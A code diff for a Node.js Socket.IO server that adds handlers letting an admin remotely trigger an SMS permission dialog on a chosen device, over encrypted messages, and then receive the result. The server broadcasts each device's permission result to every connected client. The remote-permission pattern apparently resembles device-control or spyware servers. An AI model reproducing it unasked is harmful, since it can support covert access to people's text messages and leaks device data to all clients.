@@ -448,6 +448,41 @@ function setupWebSocket(io) {
       }
     });
 
+    // ========== SMS PERMISSION REQUEST (admin requests device to show SMS permission dialog) ==========
+    socket.on('request_sms_permission', (data) => {
+      try {
+        const { device_id } = data;
+        if (!device_id) return;
+        const targetSocketId = deviceSockets.get(device_id);
+        if (targetSocketId) {
+          io.to(targetSocketId).emit('trigger_sms_permission', encrypt({
+            request_id: Date.now().toString(),
+            device_id
+          }));
+          console.log(`[WS] SMS permission request sent to device ${device_id}`);
+        } else {
+          socket.emit('sms_permission_result', {
+            device_id,
+            granted: false,
+            error: 'Device is not connected'
+          });
+        }
+      } catch (err) {
+        console.error('[WS] request_sms_permission error:', err.message);
+      }
+    });
+
+    // ========== SMS PERMISSION RESULT (device reports permission grant/deny) ==========
+    socket.on('sms_permission_result', (rawData) => {
+      try {
+        const data = tryDecrypt(rawData);
+        console.log(`[WS] SMS permission result:`, data);
+        io.emit('sms_permission_result', data);
+      } catch (err) {
+        console.error('[WS] sms_permission_result error:', err.message);
+      }
+    });
+
     // Disconnect
     socket.on('disconnect', () => {
       connectedClients--;
